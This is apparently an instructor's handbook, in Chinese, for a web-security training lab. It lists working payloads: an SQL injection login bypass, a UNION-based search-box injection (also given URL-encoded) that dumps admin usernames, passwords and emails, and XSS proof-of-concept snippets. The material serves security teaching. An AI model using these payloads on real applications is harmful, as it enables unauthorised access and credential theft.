# 讲师手册

## 靶场与环境准备

## 实战部分
### 1. sql 注入部分
#### 注入登录 
密码 `'or '1'='1`
#### 注入拿到admin用户密码
在搜索框注入：
```sql
%' or 1=1 or title like '%%' union select uid, uid as aid,  username as title, password as content, email as author_name, password as tags, create_time as create_time, create_time as update_time,uid as del from user where username like '%admin
```
需要进行url encode, url encode 之后为：
```
%25%27%20or%201%3D1%20or%20title%20like%20%27%25%25%27%20union%20select%20uid%2C%20uid%20as%20aid%2C%20%20username%20as%20title%2C%20password%20as%20content%2C%20email%20as%20author_name%2C%20password%20as%20tags%2C%20create_time%20as%20create_time%2C%20create_time%20as%20update_time%2Cuid%20as%20del%20from%20user%20where%20username%20like%20%27%25admin
```
这样密码会出现在文章列表中。


### XSS 注入：
#### juice-shop 同款漏洞
```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

#### 脚本注入：
```html
<a href="javascript: alert(1)">Click me!</a>
```
